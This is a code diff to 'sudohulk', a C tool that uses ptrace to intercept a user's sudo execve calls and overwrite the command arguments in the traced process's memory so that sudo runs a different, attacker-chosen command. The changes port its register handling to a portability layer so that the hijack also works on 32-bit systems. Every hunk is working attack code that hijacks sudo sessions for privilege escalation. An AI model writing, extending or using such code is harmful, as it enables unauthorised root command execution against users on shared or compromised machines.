@@ -16,6 +16,8 @@
 #include "sh_common.h"
 #include "sh_string.h"
 
+#include "sudohulk.h"
+
 #define ptrace_opts 	PTRACE_O_TRACEFORK  | \
 			PTRACE_O_TRACECLONE | \
 			PTRACE_O_TRACESYSGOOD
@@ -62,7 +64,7 @@ int cmd_change(pid_t pid, sudohulk_options_t *opts, struct user_regs_struct *reg
 
 	int i, j, ret = 0, malloc_size;
 
-	argv = get_remote_string_array(pid, regs->rsi+__wordsize);
+	argv = get_remote_string_array(pid, syscall_second_parameter(*regs)+__wordsize);
 
 	if(!argv){
 		printf("[-] sudo called without arguments, skipping ...\n");
@@ -74,7 +76,7 @@ int cmd_change(pid_t pid, sudohulk_options_t *opts, struct user_regs_struct *reg
 	int old_argc = args_count(argv);
 	int new_argc = args_count(opts->cmd);
 
-	first_argv_addr = ptrace(PTRACE_PEEKDATA, pid, regs->rsi, 0L);
+	first_argv_addr = ptrace(PTRACE_PEEKDATA, pid, syscall_second_parameter(*regs), 0L);
 	if(!first_argv_addr || first_argv_addr == ~0UL){
 		goto free_argv_end;
 	}
@@ -102,11 +104,11 @@ int cmd_change(pid_t pid, sudohulk_options_t *opts, struct user_regs_struct *reg
 	new_cmd[i] = NULL;
 
 	/* align address */
-	new_addr = (regs->rsi & ~0xfffL);
+	new_addr = (syscall_second_parameter(*regs) & ~0xfffL);
 	write_remote_double_char(pid, new_addr, new_cmd);
 
-	/* change the address of rsi */
-	regs->rsi = new_addr;
+	/* change the address of rsi/ebx */
+	syscall_second_parameter(*regs) = new_addr;
 	ptrace(PTRACE_SETREGS, pid, NULL, regs);
 
 	ret = 1;
@@ -176,8 +178,8 @@ int ptrace_loop(sudohulk_options_t *opts){
 				}
 
 				ptrace(PTRACE_GETREGS, return_pid, NULL, &regs);
-				if(regs.orig_rax == __NR_execve && regs.rdi){
-					char *filename = get_remote_string(return_pid, regs.rdi);
+				if(syscall_reg(regs) == __NR_execve && syscall_first_parameter(regs)){
+					char *filename = get_remote_string(return_pid, syscall_first_parameter(regs));
 					if(!filename)
 						break;
 
